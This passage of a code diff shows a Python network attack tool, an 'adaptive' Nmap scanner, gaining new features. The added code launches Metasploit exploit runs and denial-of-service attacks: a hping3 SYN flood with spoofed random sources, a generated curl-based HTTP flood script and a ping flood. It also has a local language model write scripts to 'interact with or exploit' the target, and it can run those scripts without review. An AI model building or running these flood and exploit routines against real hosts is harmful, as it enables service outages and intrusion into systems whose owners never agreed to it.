-                else:
-                    cmd.append(str(args))
-            
-            # Execute the script
-            self.logger.info(f"Executing script: {' '.join(cmd)}")
-            self.viewer.status(f"Executing script: {os.path.basename(script_path)}")
-            
-            # Set up process
+            # Execute the command
+            self.logger.debug(f"Executing: {' '.join(cmd)}")
             process = subprocess.Popen(
                 cmd,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE,
-                text=True,
-                bufsize=1
+                universal_newlines=True
             )
             
-            # Collect output
-            output_lines = []
-            for line in process.stdout:
-                output_lines.append(line.rstrip())
-                self.logger.debug(f"Script output: {line.strip()}")
+            # Process output
+            output, error = process.communicate()
+            
+            # Log results
+            if process.returncode == 0:
+                self.logger.info(f"Resource script executed successfully")
+                if self.debug:
+                    self.logger.debug(f"Output: {output}")
+                return True
+            else:
+                self.logger.error(f"Resource script execution failed: {error}")
+                return False
                 
-            # Get return code
-            return_code = process.wait()
+        except Exception as e:
+            self.logger.error(f"Error running resource script: {e}")
+            return False
+    
+    def run_exploits_on_host(self, target):
+        """Run exploits on the target host."""
+        if not self.msf_connected or not self.msf_client:
+            return
             
-            # Get stderr output
-            stderr_output = process.stderr.read()
-            if stderr_output:
-                output_lines.append("\nERROR OUTPUT:")
-                output_lines.append(stderr_output)
-                self.logger.warning(f"Script error output: {stderr_output}")
+        try:
+            self.logger.info(f"Running exploits on {target}...")
+            self.viewer.status(f"Running exploits on {target}...")
             
-            # Display execution summary
-            self.viewer.script_execution_summary(
-                script_path, 
-                return_code, 
-                "\n".join(output_lines)
-            )
+            # Generate and run a resource script
+            script_path = self.generate_resource_script()
             
-            return return_code == 0
+            if script_path:
+                result = self.run_resource_script(script_path)
+                
+                # Display result
+                if result:
+                    self.viewer.success(f"Completed exploit attempts on {target}")
+                else:
+                    self.viewer.warning(f"Exploit attempts on {target} may have failed")
             
         except Exception as e:
-            self.logger.error(f"Error executing script: {str(e)}")
-            self.logger.debug(traceback.format_exc())
-            self.viewer.error(f"Error executing script: {str(e)}")
+            self.logger.error(f"Error running exploits: {e}")
+    
+    def _get_local_ip(self):
+        """Get the local IP address to use for callbacks."""
+        try:
+            # Get all interfaces
+            interfaces = []
+            for iface in netifaces.interfaces():
+                # Skip loopback interfaces
+                if iface.startswith('lo') or iface == 'lo':
+                    continue
+                    
+                # Get addresses for interface
+                addresses = netifaces.ifaddresses(iface)
+                
+                # Get IPv4 addresses
+                if netifaces.AF_INET in addresses:
+                    for addr in addresses[netifaces.AF_INET]:
+                        ip = addr.get('addr')
+                        if ip and ip != '127.0.0.1':
+                            interfaces.append((iface, ip))
+            
+            # Get the IP of the interface we're using if specified
+            if self.interface:
+                for iface, ip in interfaces:
+                    if iface == self.interface:
+                        return ip
+            
+            # Otherwise, use the first non-virtual interface
+            for iface, ip in interfaces:
+                name = iface.lower()
+                # Skip virtual interfaces
+                if 'veth' in name or 'docker' in name or 'vmnet' in name or 'vbox' in name:
+                    continue
+                return ip
+            
+            # If no suitable interface found, use the first available
+            if interfaces:
+                return interfaces[0][1]
+            
+            # Default to localhost if nothing else works
+            return "127.0.0.1"
+            
+        except Exception as e:
+            self.logger.error(f"Error getting local IP: {e}")
+            return "127.0.0.1"
+
+    # DoS attack methods
+    def perform_dos_attack(self, target):
+        """Perform a DoS attack on the target."""
+        if not self.dos_attack:
+            return False
+            
+        try:
+            self.logger.info(f"Performing DoS attack on {target}...")
+            self.viewer.status(f"Starting DoS attack on {target}...")
+            
+            # Get open ports from scan history
+            open_ports = self.get_open_ports_from_history()
+            
+            # If no open ports, scan the target first
+            if not open_ports:
+                self.logger.info(f"No open ports found for {target}, performing quick scan...")
+                self.viewer.status(f"Scanning {target} for open ports...")
+                
+                # Run a quick scan
+                scan_params = ["-p", "21,22,23,25,80,443,445,3389", "-T4", target]
+                result = self.run_nmap_scan(scan_params)
+                
+                if result and 'scan' in result and target in result['scan']:
+                    # Extract open ports
+                    target_info = result['scan'][target]
+                    for proto in ['tcp', 'udp']:
+                        if proto in target_info:
+                            for port, port_data in target_info[proto].items():
+                                if port_data['state'] == 'open':
+                                    open_ports.append(int(port))
+            
+            self.logger.info(f"Found {len(open_ports)} open ports on {target}: {open_ports}")
+            
+            # Choose attack method based on open ports
+            attack_methods = []
+            
+            # SYN flood attack if port 80 or 443 is open
+            if 80 in open_ports or 443 in open_ports:
+                attack_methods.append("syn_flood")
+                
+            # HTTP/HTTPS flood if port 80 or 443 is open
+            if 80 in open_ports or 443 in open_ports:
+                attack_methods.append("http_flood")
+                
+            # Add a generic attack method if no specific attacks chosen
+            if not attack_methods:
+                attack_methods.append("generic_flood")
+            
+            # Choose a random attack method
+            attack_method = random.choice(attack_methods)
+            
+            # Perform the chosen attack
+            self.logger.info(f"Chosen attack method: {attack_method}")
+            
+            if attack_method == "syn_flood":
+                success = self._syn_flood_attack(target, open_ports)
+            elif attack_method == "http_flood":
+                success = self._http_flood_attack(target)
+            else:
+                success = self._generic_flood_attack(target, open_ports)
+                
+            # Display summary
+            self.viewer.dos_attack_summary(target, success, attack_method)
+            
+            return success
+            
+        except Exception as e:
+            self.logger.error(f"Error performing DoS attack: {e}")
+            self.viewer.error(f"DoS attack failed: {str(e)}")
+            return False
+    
+    def _syn_flood_attack(self, target, ports):
+        """Perform a SYN flood attack."""
+        try:
+            self.logger.info(f"Performing SYN flood attack on {target}...")
+            
+            # Choose a port for the attack
+            port = 80 if 80 in ports else 443 if 443 in ports else random.choice(ports)
+            
+            # Create hping3 command for SYN flood
+            cmd = [
+                "hping3",
+                "--flood",  # Send packets as fast as possible
+                "--rand-source",  # Use random source IP
+                "-S",  # SYN flag
+                "-p", str(port),  # Target port
+                target
+            ]
+            
+            # Execute attack for 5 seconds
+            self.logger.debug(f"Executing: {' '.join(cmd)}")
+            process = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            
+            # Let it run for 5 seconds
+            time.sleep(5)
+            
+            # Terminate the attack
+            process.terminate()
+            
+            self.logger.info(f"SYN flood attack completed on {target}:{port}")
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"Error performing SYN flood attack: {e}")
+            
+            # Check if hping3 is installed
+            if "No such file or directory" in str(e):
+                self.logger.error("hping3 not found. Please install hping3 and try again.")
+                self.viewer.error("hping3 not found. Please install hping3 with: sudo apt-get install hping3")
+            
+            return False
+    
+    def _http_flood_attack(self, target):
+        """Perform an HTTP flood attack."""
+        try:
+            self.logger.info(f"Performing HTTP flood attack on {target}...")
+            
+            # Generate a simple HTTP flood script
+            script_content = f"""#!/bin/bash
+# Simple HTTP flood script
+# Usage: bash {target}_http_flood.sh
+
+echo "Starting HTTP flood attack on {target}"
+for i in $(seq 1 100); do
+  curl -s -o /dev/null -w "%{{http_code}}\\n" http://{target}/ &
+done
+wait
+echo "HTTP flood attack completed"
+"""
+            
+            # Write script to file
+            script_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "generated_scripts")
+            os.makedirs(script_dir, exist_ok=True)
+            
+            script_path = os.path.join(script_dir, f"{target.replace('.', '_')}_http_flood.sh")
+            with open(script_path, "w") as f:
+                f.write(script_content)
+            
+            # Make it executable
+            os.chmod(script_path, os.stat(script_path).st_mode | stat.S_IEXEC)
+            
+            # Execute the script
+            self.logger.debug(f"Executing: bash {script_path}")
+            process = subprocess.Popen(
+                ["bash", script_path],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                universal_newlines=True
+            )
+            
+            # Wait for it to complete
+            output, error = process.communicate()
+            
+            if process.returncode == 0:
+                self.logger.info(f"HTTP flood attack completed on {target}")
+                return True
+            else:
+                self.logger.error(f"HTTP flood attack failed: {error}")
+                return False
+            
+        except Exception as e:
+            self.logger.error(f"Error performing HTTP flood attack: {e}")
+            return False
+    
+    def _generic_flood_attack(self, target, ports):
+        """Perform a generic network flood attack."""
+        try:
+            self.logger.info(f"Performing generic flood attack on {target}...")
+            
+            # Choose a random port if available, otherwise use port 80
+            port = random.choice(ports) if ports else 80
+            
+            # Use ping flood as a simple generic attack
+            cmd = [
+                "ping",
+                "-f",  # Flood
+                "-c", "1000",  # 1000 packets
+                target
+            ]
+            
+            # Execute attack
+            self.logger.debug(f"Executing: {' '.join(cmd)}")
+            process = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            
+            # Wait for it to complete or timeout after 5 seconds
+            try:
+                output, error = process.communicate(timeout=5)
+                
+                if process.returncode == 0:
+                    self.logger.info(f"Generic flood attack completed on {target}")
+                    return True
+                else:
+                    self.logger.error(f"Generic flood attack failed: {error.decode()}")
+                    return False
+            except subprocess.TimeoutExpired:
+                # Kill the process if it's taking too long
+                process.kill()
+                process.communicate()
+                
+                self.logger.info(f"Generic flood attack timeout on {target}")
+                return True
+            
+        except Exception as e:
+            self.logger.error(f"Error performing generic flood attack: {e}")
+            return False
+    
+    # Script generation and execution methods
+    def generate_custom_script(self, script_type="bash", target_info=None):
+        """Generate a custom script for the target based on scan results."""
+        try:
+            self.logger.info(f"Generating custom {script_type} script for {self.target}...")
+            self.viewer.status(f"Generating custom {script_type} script...")
+            
+            # Use target info if provided, otherwise get open ports from history
+            if not target_info:
+                open_ports = self.get_open_ports_from_history()
+                target_info = {
+                    'target': self.target,
+                    'open_ports': open_ports
+                }
+            
+            # Create script directory if it doesn't exist
+            script_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "generated_scripts")
+            os.makedirs(script_dir, exist_ok=True)
+            
+            # Generate script filename
+            timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
+            script_filename = f"{self.target.replace('.', '_')}_{timestamp}.{self._get_script_extension(script_type)}"
+            script_path = os.path.join(script_dir, script_filename)
+            
+            # Prepare context for the LLM
+            context = self.prepare_ollama_context()
+            
+            # Construct the prompt for the LLM
+            prompt = f"""Generate a {script_type} script to interact with or exploit the target system at {self.target}.
+
+Target Information:
+- IP Address: {self.target}
+- Open Ports: {target_info.get('open_ports', [])}
+
+Requirements:
+- The script should be written in {script_type}
+- It should perform reconnaissance on the open ports
+- Include error handling and proper exit codes
+- Add helpful comments explaining what each section does
+- The script must be ethical and non-destructive
+
+Script Template Format:
+```{script_type}
+#!/bin/bash  # Or appropriate shebang
+# Script title
+# Description
+# Usage instructions
+
+# Main code here
+```
+
+Please generate a complete, executable {script_type} script:"""
+
+            # Call Ollama to generate the script
+            self.logger.info(f"Asking Ollama to generate a {script_type} script...")
+            response = self.call_ollama(prompt)
+            
+            if not response:
+                self.logger.error("Failed to get response from Ollama")
+                # Generate a fallback script without LLM
+                script_content = self._generate_fallback_script(script_type, target_info)
+            else:
+                # Extract the script from the response
+                script_content = self._extract_script_from_response(response, script_type)
+            
+            # Write the script to file
+            with open(script_path, "w") as f:
+                f.write(script_content)
+            
+            # Make the script executable
+            os.chmod(script_path, os.stat(script_path).st_mode | stat.S_IEXEC)
+            
+            self.logger.info(f"Generated {script_type} script: {script_path}")
+            self.viewer.script_generation_summary(
+                script_path,
+                script_type.upper(),
+                f"Custom script for reconnaissance of {self.target}"
+            )
+            
+            # Execute the script if requested
+            if self.execute_scripts:
+                self.execute_generated_script(script_path)
+            
+            return script_path
+            
+        except Exception as e:
+            self.logger.error(f"Error generating custom script: {e}")
+            self.self.logger.info("Script generation failed: {str(e)}")
+            return None
+    
+    def _extract_script_from_response(self, response, script_type):
+        """Extract the script from the LLM response."""
+        try:
+            # Regular expression to extract code blocks
+            code_block_pattern = r"```(?:" + script_type + r"|shell|bash)?(.+?)```"
+            code_blocks = re.findall(code_block_pattern, response, re.DOTALL)
+            
+            if code_blocks:
+                # Use the first code block
+                return code_blocks[0].strip()
+            else:
+                # If no code blocks found, just use the whole response
+                return response.strip()
+                
+        except Exception as e:
+            self.logger.error(f"Error extracting script from response: {e}")
+            return response.strip()
+    
+    def _generate_fallback_script(self, script_type, target_info):
+        """Generate a fallback script without using the LLM."""
+        target = target_info.get('target', self.target)
+        open_ports = target_info.get('open_ports', [])
+        
+        if script_type.lower() == "bash" or script_type.lower() == "shell":
+            return self._generate_fallback_bash_script(target, open_ports)
+        elif script_type.lower() == "python":
+            return self._generate_fallback_python_script(target, open_ports)
+        else:
+            # Default to bash
+            return self._generate_fallback_bash_script(target, open_ports)
+    
+    def _generate_fallback_bash_script(self, target, open_ports):
+        """Generate a fallback bash script."""
+        script = f"""#!/bin/bash
+# Reconnaissance Script for {target}
+# Generated on {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+# This script performs basic reconnaissance on a target system
+
+TARGET="{target}"
+OPEN_PORTS=({' '.join(str(port) for port in open_ports)})
+
+echo "Starting reconnaissance on $TARGET"
+echo "Open ports: ${{OPEN_PORTS[@]}}"
+
+# Ping the target
+echo "Checking if host is up..."
+ping -c 3 $TARGET
+
+# Check each open port
+for PORT in "${{OPEN_PORTS[@]}}"; do
+  echo "Checking port $PORT..."
+  
+  case $PORT in
+    21)
+      echo "FTP port detected, checking banner..."
+      echo -e "\\n" | nc -w 5 $TARGET $PORT
+      ;;
+    22)
+      echo "SSH port detected, checking banner..."
+      echo -e "\\n" | nc -w 5 $TARGET $PORT
+      ;;
+    80|443)
+      echo "Web port detected, checking headers..."
+      curl -s -I http://$TARGET:$PORT
+      ;;
+    *)
+      echo "Generic port check..."
+      nc -z -w 5 $TARGET $PORT && echo "Port $PORT is open" || echo "Port $PORT is closed"
+      ;;
+  esac
+done
+
+echo "Reconnaissance completed"
+"""
+        return script
+    
+    def _generate_fallback_python_script(self, target, open_ports):
+        """Generate a fallback Python script."""
+        script = f"""#!/usr/bin/env python3
+# Reconnaissance Script for {target}
+# Generated on {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+# This script performs basic reconnaissance on a target system
+
+import socket
+import subprocess
+import sys
+import os
+
+TARGET = "{target}"
+OPEN_PORTS = {open_ports}
+
+def main():
+    print(f"Starting reconnaissance on {{TARGET}}")
+    print(f"Open ports: {{OPEN_PORTS}}")
+    
+    # Ping the target
+    print("Checking if host is up...")
+    try:
+        subprocess.run(["ping", "-c", "3", TARGET], check=True)
+    except subprocess.CalledProcessError:
+        print(f"Host {{TARGET}} appears to be down")
+    
+    # Check each open port
+    for port in OPEN_PORTS:
+        print(f"Checking port {{port}}...")
+        
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(5)
+                result = s.connect_ex((TARGET, port))
+                if result == 0:
+                    print(f"Port {{port}} is open")
+                else:
+                    print(f"Port {{port}} is closed")
+        except Exception as e:
+            print(f"Error checking port {{port}}: {{e}}")
+    
+    print("Reconnaissance completed")
+
+if __name__ == "__main__":
+    main()
+"""
+        return script
+    
+    def _get_script_extension(self, script_type):
+        """Get the appropriate file extension for the script type."""
+        script_type = script_type.lower()
+        if script_type == "bash" or script_type == "shell":
+            return "sh"
+        elif script_type == "python":
+            return "py"
+        elif script_type == "ruby":
+            return "rb"
+        elif script_type == "perl":
+            return "pl"
+        elif script_type == "powershell":
+            return "ps1"
+        else:
+            return "txt"
+    
+    def execute_generated_script(self, script_path, args=None):
+        """Execute a generated script."""
+        if not os.path.exists(script_path):
+            self.logger.error(f"Script not found: {script_path}")
+            return False
+            
+        try:
+            self.logger.info(f"Executing script: {script_path}")
+            self.viewer.status(f"Executing script: {os.path.basename(script_path)}")
+            
+            # Determine script type from extension
+            file_ext = os.path.splitext(script_path)[1].lower()
+            
+            # Build command based on script type
+            if file_ext == ".py":
+                cmd = ["python3", script_path]
+            elif file_ext == ".rb":
+                cmd = ["ruby", script_path]
+            elif file_ext == ".pl":
+                cmd = ["perl", script_path]
+            elif file_ext == ".ps1":
+                cmd = ["powershell", "-ExecutionPolicy", "Bypass", "-File", script_path]
+            else:
+                # Default to bash for .sh and unknown extensions
+                cmd = ["bash", script_path]
+            
+            # Add any additional arguments
+            if args:
+                cmd.extend(args)
+            
+            # Execute the script
+            self.logger.debug(f"Executing: {' '.join(cmd)}")
+            
+            # Start animation
+            animation = self.viewer.scanning_animation(f"Running {os.path.basename(script_path)}")
+            
+            process = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                universal_newlines=True
+            )
+            
+            # Wait for it to complete
+            output, error = process.communicate()
+            
+            # Stop animation
+            animation.set()
+            
+            # Combine stdout and stderr
+            combined_output = output
+            if error:
+                combined_output += f"\nERROR OUTPUT:\n{error}"
+            
+            # Display summary
+            self.viewer.script_execution_summary(
+                script_path,
+                process.returncode,
+                combined_output
+            )
+            
+            if process.returncode == 0:
+                self.logger.info(f"Script executed successfully")
+                return True
+            else:
+                self.logger.error(f"Script execution failed with return code {process.returncode}")
+                return False
+                
+        except Exception as e:
+            self.logger.error(f"Error executing script: {e}")
+            self.viewer.error(f"Script execution failed: {str(e)}")
             return False
 
     def run(self):
-        """Run the adaptive scanner."""
-        # Set up signal handler for clean termination
-        signal.signal(signal.SIGINT, self._signal_handler)
-        self.running = True
-        
-        # Initialize scan history
-        if not hasattr(self, 'scan_history'):
-            self.scan_history = []
+        """Main execution method."""
+        try:
+            # Set up Metasploit if needed
+            if self.msf_integration:
+                self.setup_metasploit()
             
-        # Initial run variables
-        should_continue = True
-        iteration = 0
-        previous_result = None
-        
-        # Setup Metasploit integration if enabled
-        if self.msf_integration:
-            self.setup_metasploit()
-            
-            # If --msf option is specified and no other scan options are set,
-            # and we already have scan results from the initial scan, 
-            # we can proceed directly to exploitation
-            if hasattr(self, 'scan_history') and self.scan_history and not hasattr(self, 'max_iterations'):
-                # Process the initial scan results with Metasploit
-                self.process_results_with_metasploit(self.scan_history[-1])
+            # Display start banner
+            scan_type = "Adaptive Reconnaissance"
+            if self.msf_integration:
+                scan_type += " with Metasploit Integration"
+            if self.exploit:
+                scan_type += " and Exploitation"
+            if self.dos_attack:
+                scan_type += " and DoS Testing"
                 
-                # If exploit flag is enabled, run exploits on the target
-                if self.exploit and self.target:
-                    self.run_exploits_on_host(self.target)
-                    
-                # If DoS attack is enabled, attempt it
-                if self.dos_attack and self.target:
-                    self.perform_dos_attack(self.target)
-                    
-                # Exit if we're just using the MSF option without adaptive scanning
-                should_continue = False
-        
-        # Main scan loop
-        while should_continue and self.running:
-            # Check if we need to discover hosts first
-            if self.auto_discover and iteration == 0:
-                self._discover_network()
-                
-                # If no target was explicitly specified but we found hosts,
-                # use the first discovered host as the target
-                if not self.target and self.discovered_hosts:
-                    self.target = self.discovered_hosts[0]
-                    self.logger.info(f"Setting first discovered host as target: {self.target}")
-                    self.viewer.status(f"Selected {self.target} as initial target")
-                    
-            # If no target is specified even after discovery, exit
-            if not self.target:
-                self.logger.error("No target specified for scanning")
-                self.viewer.error("No target specified. Use --target or --auto-discover option.")
-                break
+            self.viewer.display_start_banner(self.target, scan_type, self.ollama_model)
             
-            # Display banner at the start of each iteration
-            if iteration == 0:
-                self.viewer.display_start_banner(
-                    self.target, 
-                    "Adaptive" if not self.stealth else "Stealth", 
-                    self.ollama_model
-                )
+            # Run iterative scanning process
+            iteration = 1
+            continue_scanning = True
             
-            # Generate scan parameters based on previous scan results
-            scan_params = self.generate_scan_parameters(iteration)
-            if not scan_params:
-                self.logger.error("Failed to generate scan parameters")
-                self.viewer.error("Failed to generate scan parameters")
-                break
+            while continue_scanning and self.running:
+                self.logger.info(f"Starting scan iteration {iteration} for {self.target}")
+                self.viewer.section(f"ITERATION {iteration}")
                 
-            # Run the Nmap scan with the generated parameters
-            result = self.run_nmap_scan(scan_params)
-            
-            if result:
-                # Add target info to the result
-                result['target'] = self.target
+                # Generate scan parameters
+                scan_params = self.generate_scan_parameters(iteration)
                 
-                # Store result in scan history
-                self.scan_history.append(result)
+                # Run Nmap scan
+                result = self.run_nmap_scan(scan_params)
+                
+                if not result:
+                    self.logger.error(f"Scan failed for {self.target}")
+                    self.viewer.error(f"Scan failed for {self.target}")
+                    break
+                
+                # Add to scan history
+                self.scan_history.append({
+                    'iteration': iteration,
+                    'target': self.target,
+                    'params': scan_params,
+                    'result': result
+                })
                 
                 # Summarize results
                 self.summarize_results(result)
                 
-                # Process with Metasploit if integration enabled
+                # Process results with Metasploit if enabled
                 if self.msf_integration:
                     self.process_results_with_metasploit(result)
-                    
-                    # If exploit flag is enabled, run exploits on the target
-                    if self.exploit:
-                        self.run_exploits_on_host(self.target)
                 
-                # Process with DoS if enabled
+                # Generate custom script if requested
+                if self.auto_script or self.custom_scripts:
+                    if self.script_type == "auto":
+                        script_type = self.determine_best_script_type()
+                    else:
+                        script_type = self.script_type
+                        
+                    script_path = self.generate_custom_script(script_type)
+                
+                # Perform DoS attack if enabled
                 if self.dos_attack:
                     self.perform_dos_attack(self.target)
-                    
-                # Generate custom scripts if enabled
-                if self.custom_scripts:
-                    script_path = self.generate_custom_script(
-                        script_type=self.script_type or self.determine_best_script_type(),
-                        target_info=result
-                    )
-                    
-                    # Execute generated scripts if enabled
-                    if self.execute_scripts and script_path:
-                        self.execute_generated_script(script_path)
                 
-                # Store for next iteration
-                previous_result = result
-                
-            # Update iteration counter
-            iteration += 1
-            
-            # Check if we should continue
-            if self.continuous:
-                self.logger.info("Continuous mode enabled, continuing to next scan")
-                should_continue = True
-            elif self.max_iterations and iteration < self.max_iterations:
-                self.logger.info(f"Completed iteration {iteration}/{self.max_iterations}")
-                should_continue = True
-            else:
-                self.logger.info("Maximum iterations reached or not in continuous mode. Exiting.")
-                should_continue = False
-                
-            # Move to next target if scanning all hosts
-            if self.scan_all and not self.continuous:
-                if self.next_target():
-                    should_continue = True
-                    # Reset iteration counter for the new target
-                    iteration = 0
+                # Check if we should continue
+                iteration += 1
+                if iteration > self.max_iterations:
+                    self.logger.info(f"Reached maximum iterations ({self.max_iterations})")
+                    continue_scanning = False
+                elif self.continuous:
+                    self.logger.info(f"Continuous mode enabled, continuing to next iteration")
+                    time.sleep(self.delay)
                 else:
-                    should_continue = False
-                    
-            # Add delay between iterations if needed
-            if should_continue and self.delay > 0:
-                self.logger.info(f"Waiting {self.delay} seconds before next scan")
-                time.sleep(self.delay)
-        
-        # Final message
-        if not self.running:
-            self.logger.info("Scan terminated by user")
-            self.viewer.warning("Scan terminated by user")
-        else:
-            self.logger.info("Scan completed successfully")
-            self.viewer.success("Scan completed successfully")
-
-    def determine_best_script_type(self):
-        """Determine the best script type based on discovered services."""
-        if not self.discovered_services:
-            return "bash"  # Default to bash if no services discovered
-        
-        # Count service types
-        web_services = 0
-        database_services = 0
-        windows_services = 0
-        
-        for port_key, service_info in self.discovered_services.items():
-            service = service_info.get('service', '').lower()
+                    self.logger.info(f"Not in continuous mode, stopping after first iteration")
+                    continue_scanning = False
             
-            if service in ['http', 'https', 'www', 'apache', 'nginx', 'iis', 'tomcat']:
-                web_services += 1
-            elif service in ['mysql', 'postgresql', 'mssql', 'oracle', 'db2']:
-                database_services += 1
-            elif service in ['smb', 'microsoft-ds', 'netbios', 'ldap', 'kerberos']:
-                windows_services += 1
-        
-        # Choose script type based on discovered services
-        if web_services > database_services and web_services > windows_services:
-            return "python"  # Python is good for web services
-        elif database_services > web_services and database_services > windows_services:
-            return "ruby"    # Ruby for database services (like in Metasploit)
-        else:
-            return "bash"    # Bash for general purpose or Windows services
-
-    def generate_scan_parameters(self, iteration):
-        """Generate Nmap scan parameters based on the current iteration."""
-        # First iteration: basic scan
-        if iteration == 1:
-            if self.stealth:
-                return ["-sS", "-T2", "--max-retries", "1", "-Pn", self.target]
+            # Check if we should move to the next target
+            if self.running and self.scan_all and self.next_target():
+                # Reset scan history for the new target
+                self.scan_history = []
+                
+                # Run scan process for the new target
+                self.run()
+                
+            # Display completion message
+            if self.running:
+                self.viewer.success("Scan process completed")
             else:
-                return ["-sV", "-O", self.target]
-        
-        # For later iterations, use Ollama to suggest parameters
-        self.logger.info("Asking Ollama for next scan strategy...")
-        
-        # Prepare context for Ollama
-        prompt = self.construct_prompt(iteration)
-        
-        # Get suggestion from Ollama (with live streaming for better user experience)
-        response = self.call_ollama(prompt, stream=self.show_live_ai)
-        
-        if not response:
-            self.logger.warning("Failed to get response from Ollama, using default parameters")
-            # Fallback strategy
-            if self.stealth:
-                return ["-sS", "-T2", "-p-", "-Pn", self.target]
-            else:
-                return ["-sV", "-O", "--version-all", "-p-", self.target]
-        
-        # Try to extract parameters from response
-        try:
-            params_match = re.search(r'Parameters:\s*\[([^\]]+)\]', response, re.IGNORECASE)
-            if params_match:
-                params_str = params_match.group(1)
-                # Clean up the parameters
-                params = re.findall(r'-[a-zA-Z-]+(?:\s+\w+)?', params_str)
-                if params:
-                    clean_params = []
-                    for p in params:
-                        p = p.strip()
-                        clean_params.append(p)
-                    
-                    # Add target and return
-                    clean_params.append(self.target)
-                    self.logger.info(f"Using AI-suggested parameters: {' '.join(clean_params)}")
-                    return clean_params
+                self.viewer.warning("Scan process interrupted")
             
-            # If we couldn't extract parameters with regex, try to find a command line
-            cmd_match = re.search(r'nmap\s+(.*?)(?:$|\n)', response, re.IGNORECASE)
-            if cmd_match:
-                cmd = cmd_match.group(1).strip()
-                params = cmd.split()
-                # Filter out the target if present
-                params = [p for p in params if not (p.startswith('192.168.') or p.startswith('10.') or p.startswith('172.') or '/' in p)]
-                params.append(self.target)
-                self.logger.info(f"Using AI-suggested command parameters: {' '.join(params)}")
-                return params
-            
-            # Fallback if extraction fails
-            self.logger.warning("Could not extract scan parameters from Ollama response, using defaults")
-            # Return default parameters
-            if self.stealth:
-                return ["-sS", "-T2", "-p-", "-Pn", self.target]
-            else:
-                return ["-sV", "-O", "--version-all", "-p-", self.target]
-        
         except Exception as e:
-            self.logger.error(f"Error extracting scan parameters: {str(e)}")
-            self.logger.debug(traceback.format_exc())
-            # Return default parameters
+            self.logger.error(f"Error during scan process: {e}")
+            self.viewer.error(f"Scan process failed: {str(e)}")
+            if self.debug:
+                self.logger.error(traceback.format_exc())
+    
+    def determine_best_script_type(self):
+        """Determine the best script type based on scan results."""
+        # Default to bash
+        script_type = "bash"
+        
+        try:
+            # Get open ports from scan history
+            open_ports = self.get_open_ports_from_history()
+            
+            # Check if specific services are running
+            has_web_server = False
+            has_windows_services = False
+            
+            for entry in self.scan_history:
+                result = entry.get('result', {})
+                if 'scan' in result and self.target in result['scan']:
+                    target_info = result['scan'][self.target]
+                    
+                    # Check for web services
+                    for proto in ['tcp', 'udp']:
+                        if proto in target_info:
+                            for port, port_data in target_info[proto].items():
+                                service = port_data.get('name', '').lower()
+                                
+                                if service in ['http', 'https']:
+                                    has_web_server = True
+                                elif service in ['msrpc', 'microsoft-ds', 'netbios-ssn']:
+                                    has_windows_services = True
+            
+            # Choose script type based on services
+            if has_web_server:
+                script_type = "python"  # Python is good for web services
+            elif has_windows_services:
+                script_type = "powershell"  # PowerShell for Windows targets
+                
+            self.logger.info(f"Determined best script type: {script_type}")
+            return script_type
+            
+        except Exception as e:
+            self.logger.error(f"Error determining best script type: {e}")
+            return script_type
+    
+    def generate_scan_parameters(self, iteration):
+        """Generate Nmap scan parameters based on iteration."""
+        # Base parameters
+        params = ["-oX", "-"]  # Output XML to stdout
+        
+        # Add target
+        params.append(self.target)
+        
+        # First iteration - Quick scan
+        if iteration == 1:
+            self.logger.info("First iteration: Quick scan to identify open ports")
+            
+            # Add stealth option if requested
             if self.stealth:
-                return ["-sS", "-T2", "-p-", "-Pn", self.target]
+                params.extend(["-sS", "-T2"])
             else:
-                return ["-sV", "-O", "--version-all", "-p-", self.target]
-
+                params.extend(["-sS", "-T4"])
+                
+            # Scan top ports
+            params.extend(["-F"])  # Fast mode - scan fewer ports
+            
+            # Version detection and OS detection with limited intensity
+            params.extend(["-sV", "--version-intensity", "2"])
+            params.extend(["-O", "--osscan-limit"])
+            
+        # Second iteration - More detailed scan of open ports
+        elif iteration == 2:
+            self.logger.info("Second iteration: Detailed scan of ports found in first scan")
+            
+            # Add stealth option if requested
+            if self.stealth:
+                params.extend(["-sS", "-T2"])
+            else:
+                params.extend(["-sS", "-T4"])
+                
+            # Get open ports from previous scan
+            open_ports = self.get_open_ports_from_history()
+            
+            if open_ports:
+                # Create a comma-separated list of ports
+                port_list = ','.join(str(port) for port in open_ports)
+                params.extend(["-p", port_list])
+                
+                # More intense version detection
+                params.extend(["-sV", "--version-intensity", "4"])
+                
+                # OS detection
+                params.extend(["-O"])
+                
+                # Script scanning for open ports
+                params.extend(["--script", "default,safe"])
+            else:
+                # No open ports found, do a more thorough scan
+                params.extend(["-p", "1-1000"])
+                params.extend(["-sV"])
+                params.extend(["-O"])
+                
+        # Third iteration - Advanced scanning
+        else:
+            self.logger.info("Advanced iteration: Comprehensive scan")
+            
+            # Add stealth option if requested
+            if self.stealth:
+                params.extend(["-sS", "-T2"])
+            else:
+                params.extend(["-sS", "-T4"])
+                
+            # Get open ports from previous scans
+            open_ports = self.get_open_ports_from_history()
+            
+            if open_ports:
+                # Create a comma-separated list of ports
+                port_list = ','.join(str(port) for port in open_ports)
+                params.extend(["-p", port_list])
+                
+                # Full version detection
+                params.extend(["-sV", "--version-all"])
+                
+                # OS detection
+                params.extend(["-O", "--osscan-guess"])
+                
+                # Comprehensive script scanning for open ports
+                params.extend(["--script", "default,safe,auth,discovery"])
+            else:
+                # No open ports found, do a more thorough scan
+                params.extend(["-p", "1-10000"])
+                params.extend(["-sV", "--version-intensity", "4"])
+                params.extend(["-O", "--osscan-guess"])
+                params.extend(["--script", "default,safe"])
+                
+        self.logger.info(f"Scan parameters: {' '.join(params)}")
+        return params
+    
     def run_nmap_scan(self, scan_params):
         """Run an Nmap scan with the given parameters and return the result."""
         try:
@@ -1855,547 +2095,504 @@ class AdaptiveNmapScanner:
                 self.logger.warning(f"No results found for target {target}")
                 self.viewer.warning(f"No results found for target {target}")
                 return None
-            
-        except nmap.PortScannerError as e:
